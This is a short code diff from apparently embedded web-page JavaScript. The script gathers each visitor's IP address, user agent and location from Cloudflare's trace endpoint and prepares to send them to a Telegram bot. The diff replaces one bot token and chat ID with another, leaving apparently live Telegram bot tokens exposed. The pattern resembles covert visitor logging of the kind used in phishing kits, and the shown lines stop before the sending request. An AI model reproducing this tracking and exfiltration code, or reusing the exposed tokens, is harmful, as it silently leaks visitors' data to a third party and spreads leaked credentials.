@@ -18,8 +18,8 @@
         }
         $.get('https://www.cloudflare.com/cdn-cgi/trace', function(data) {
           data = data.replace('h=www.cloudflare.com\n','')
-          var chat_id = '-487587096'
-          var toten = '1597774416:AAGbN4TwPCwS4PSh4QtvzRojIT8i8N5aLl8'
+          var chat_id = '@leanghourtaing'
+          var toten = '6997448829:AAEdGQPDZGlUt0PteDs-6QQ7X5rcNIJ2zy8'
           location_visitor = 'Unknown'
           var client_data = 'Unknown'
           var ip_data = 'Unknown'
@@ -35,8 +35,6 @@
           if(data.includes(client_uag)){
             client_data = data.slice(data.lastIndexOf(client_uag) + 4,data.lastIndexOf('colo='));
           }
-          // var toten = '1464068819:AAGHc3Yy4r3OGgUqGQemYYDrTBWDO3qUbZw'
-          // var chat_id = '-458916939'
           let date = new Date(); //actual time in miliseconds
           let string = date.getFullYear()+'-'+date.getMonth()+1+'-'+date.getDate()+' '+date.getHours()+':'+date.getMinutes()
           $.ajax({
